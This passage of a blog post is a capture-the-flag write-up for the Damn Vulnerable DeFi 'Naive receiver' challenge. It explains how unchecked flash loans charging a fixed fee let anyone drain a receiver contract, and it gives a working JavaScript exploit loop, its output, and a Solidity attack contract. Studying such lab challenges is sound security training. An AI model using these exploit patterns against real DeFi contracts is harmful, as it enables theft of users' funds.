+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">pool</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">flashLoan</span>(<span style="color:#00f">this</span>.<span style="color:#000">receiver</span>.<span style="color:#000">address</span>, <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">parseEther</span>(<span style="color:#5a2">&#39;0&#39;</span>)); 
+</span></span><span style="display:flex;"><span>    }</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>When calling <code>functionCallWithValue</code>, the <code>borrowAmount</code>, that in our example is <code>0</code>, is sent to the borrower. Since <code>receiveEther</code> is a payable function, the borrower&rsquo;s balance is updated with the amount received (that in our example is <code>0</code> - so it does not change).</p>
+<p>Inside <code>receivedEther</code>, the value of <code>amountToBeRepaid</code> (line <code>24</code>) will be equal to <code>0 ETH + 1 ETH = 1 ETH</code> and thus the condition <code>require(address(this).balance &gt;= amountToBeRepaid)</code> will be <code>true</code> since the receiver balance is <code>10 ETH</code> and the amount to be repaid is <code>1 ETH</code>.
+Finally, <code>1 ETH</code> is sent back to the pool, decreasing the borrower balance by <code>1 ETH</code>.
+So, after calling <code>receiveEther</code>, the receiver&rsquo;s balance is decreased by <code>1 ETH</code> (the fee applied by the pool).</p>
+<p>If we call <code>flashLoan</code> another time with the same input, the borrower&rsquo;s balance will be <code>9 ETH</code>, so the condition <code>require(address(this).balance &gt;= amountToBeRepaid)</code> will still be <code>true</code> (<code>9 &gt;= 1</code>) and it will be decreased by <code>1 ETH</code>.</p>
+<p>So, executing the function <code>10</code> times will drain the borrower&rsquo;s balance.</p>
+<h2 id="3-solution">3) Solution</h2>
+<p>There are multiple ways to solve this challenge.</p>
+<h3 id="31-solution-1-multiple-transactions">3.1) Solution 1: multiple transactions</h3>
+<p>We can call <code>flashLoan</code> <code>10</code> times in a loop and drain all the borrower&rsquo;s balance.:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">balance</span> = <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">formatEther</span>(<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#00f">this</span>.<span style="color:#000">receiver</span>.<span style="color:#000">address</span>));
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">while</span> (<span style="color:#000">balance</span> &gt; <span style="color:#3af">0</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`Borrower balance: </span><span style="color:#5a2">${</span><span style="color:#000">balance</span><span style="color:#5a2">}</span><span style="color:#5a2">`</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">pool</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">flashLoan</span>(<span style="color:#00f">this</span>.<span style="color:#000">receiver</span>.<span style="color:#000">address</span>, <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">parseEther</span>(<span style="color:#5a2">&#39;0&#39;</span>));
+</span></span><span style="display:flex;"><span>            <span style="color:#000">balance</span> = <span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">formatEther</span>(<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#00f">this</span>.<span style="color:#000">receiver</span>.<span style="color:#000">address</span>));
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`Borrower balance: </span><span style="color:#5a2">${</span><span style="color:#000">balance</span><span style="color:#5a2">}</span><span style="color:#5a2">`</span>);
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<p>Output:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Borrower balance: 10.0
+</span></span><span style="display:flex;"><span>Borrower balance: 9.0
+</span></span><span style="display:flex;"><span>Borrower balance: 8.0
+</span></span><span style="display:flex;"><span>Borrower balance: 7.0
+</span></span><span style="display:flex;"><span>Borrower balance: 6.0
+</span></span><span style="display:flex;"><span>Borrower balance: 5.0
+</span></span><span style="display:flex;"><span>Borrower balance: 4.0
+</span></span><span style="display:flex;"><span>Borrower balance: 3.0
+</span></span><span style="display:flex;"><span>Borrower balance: 2.0
+</span></span><span style="display:flex;"><span>Borrower balance: 1.0
+</span></span><span style="display:flex;"><span>Borrower balance: 0.0</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>However, with the code above, every time we call <code>flashLoan</code>, this will be executed in a single transaction, so we need to perform <code>10</code> transactions to solve the challenge.</p>
+<h3 id="32-solution-2-single-transaction">3.2) Solution 2: single transaction</h3>
+<p>To optimize the number of transactions, we can implement the same logic in a contract and then call the function only once.</p>
+<p><code>AttackNaiveReceiver.sol</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#888;font-style:italic">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"></span><span style="color:#00f">pragma solidity</span> ^<span style="color:#3af">0</span>.<span style="color:#3af">8</span>.<span style="color:#3af">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">interface</span> <span style="color:#000">INaiveReceiverLenderPool</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">flashLoan</span>(<span style="color:#00f">address</span> <span style="color:#000">borrower</span>, <span style="color:#00f">uint256</span> <span style="color:#000">borrowAmount</span>) <span style="color:#00f">external</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic">/**
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> * @title AttackNaiveReceiver
+</span></span></span><span style="display:flex;"><span><span style="color:#888;font-style:italic"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">contract</span> <span style="color:#000">AttackNaiveReceiver</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#000">INaiveReceiverLenderPool</span> <span style="color:#000">lenderPool</span>;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">constructor</span>(<span style="color:#00f">address</span> <span style="color:#000">_pool</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#000">lenderPool</span> = <span style="color:#000">INaiveReceiverLenderPool</span>(<span style="color:#000">_pool</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">function</span> <span style="color:#000">run</span>(<span style="color:#00f">address</span> <span style="color:#000">_borrower</span>) <span style="color:#00f">public</span> {
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">while</span>(<span style="color:#00f">address</span>(<span style="color:#000">_borrower</span>).<span style="color:#000">balance</span> &gt; <span style="color:#3af">0</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#000">lenderPool</span>.<span style="color:#000">flashLoan</span>(<span style="color:#000">_borrower</span>, <span style="color:#3af">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p><code>naive-receiver.challenge.js</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">attack</span> = <span style="color:#00f">await</span> (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">getContractFactory</span>(<span style="color:#5a2">&#39;AttackNaiveReceiver&#39;</span>, <span style="color:#000">attacker</span>)).<span style="color:#000">deploy</span>(<span style="color:#00f">this</span>.<span style="color:#000">pool</span>.<span style="color:#000">address</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">attack</span>.<span style="color:#000">run</span>(<span style="color:#00f">this</span>.<span style="color:#000">receiver</span>.<span style="color:#000">address</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>You can find the complete code <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/test/naive-receiver/naive-receiver.challenge.js" target="_blank" rel="noopener noreffer ">here</a> and <a href="https://github.com/dellalibera/damn-vulnerable-defi-solutions/blob/master/contracts/attacker-contracts/AttackNaiveReceiver.sol" target="_blank" rel="noopener noreffer ">here</a>.</p>
+<h2 id="4-references">4) References</h2>
+<ul>
+<li><a href="https://docs.openzeppelin.com/contracts/4.x/api/security#ReentrancyGuard" target="_blank" rel="noopener noreffer ">ReentrancyGuard</a></li>
+</ul></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on September 6, 2022</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_02_naive-receiver/" data-title="Damn Vulnerable DeFi - Challenge #2 - Naive receiver" data-via="_d3lla_" data-hashtags="Damn Vulnerable DeFi,CTF,Solidity,Blockchain"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_02_naive-receiver/" data-hashtag="Damn Vulnerable DeFi"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://dellalibera.github.io/posts/damnvulnerabledefi_02_naive-receiver/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/damn-vulnerable-defi/">Damn Vulnerable DeFi</a>,&nbsp;<a href="/tags/ctf/">CTF</a>,&nbsp;<a href="/tags/solidity/">Solidity</a>,&nbsp;<a href="/tags/blockchain/">Blockchain</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/evm-puzzles_solutions/" class="prev" rel="prev" title="EVM Puzzles solutions"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>EVM Puzzles solutions</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://dellalibera.github.io/about/" target="_blank">della</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/css/e2eb86.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
